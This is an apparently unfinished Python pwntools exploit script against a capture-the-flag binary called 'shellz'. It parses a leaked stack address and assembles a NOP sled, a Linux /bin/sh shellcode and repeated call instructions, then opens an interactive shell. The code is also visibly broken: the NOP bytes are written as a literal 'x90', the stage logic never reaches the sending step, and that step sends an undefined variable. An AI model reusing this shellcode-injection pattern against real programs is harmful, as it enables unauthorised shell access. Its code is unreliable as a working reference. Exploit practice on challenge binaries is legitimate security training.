#!/usr/bin/python3

from binascii import unhexlify
from pwn import *
from math import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

def io_beg():
	return process("./shellz")
	#process("./simple")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("Here is a random stack address:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			print("Cooking")
			
			io = io_beg()						
			io_rdy(io)
			
			addr = io.recvline().decode(ENCODING)
			addr = addr.strip().split("x")[-1]
			print("addr: "+addr)
			
			addr_int = int(addr, 16)
			neg_addr_int = 0x100000000-addr_int
			neg_addr_int2 = int(neg_addr_int/2)
			payload_len = neg_addr_int
			
			jmp_instr = "call ff900000"  #"mov eax -"+str(neg_addr_int2)+"\n"+"jmp eax"
			print("Jmp raw: "+jmp_instr)
			
			jmp_instr = asm(jmp_instr)
			jmp_instr_len = len(jmp_instr)
			print("neg_addr_int: "+str(neg_addr_int))
			print("jmp_instr_len (bytes): "+str(jmp_instr_len))
			print("pay len (0): "+str(payload_len))
			
			
			#---------------123456789
			shellcode = asm(shellcraft.i386.linux.sh())
			shellcode_len =  len(shellcode)
			
			payload = b'x90'*neg_addr_int2
			payload_len -= neg_addr_int2
			print("pay len (1): "+str(payload_len))
			
			payload += shellcode
			payload_len -= shellcode_len
			print("pay len (2): "+str(payload_len))
			
			payload += jmp_instr*math.ceil(payload_len/jmp_instr_len)
			payload_len -= math.ceil(payload_len/jmp_instr_len)
			print("pay len (3): "+str(payload_len))

		if(stage == 1):
			io = io_beg()						
			io_rdy(io)
			
			sleep(1)
						
			print("1. Deploying ")
			io.send_raw(rom) # win
			print("2. Fire")
			io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
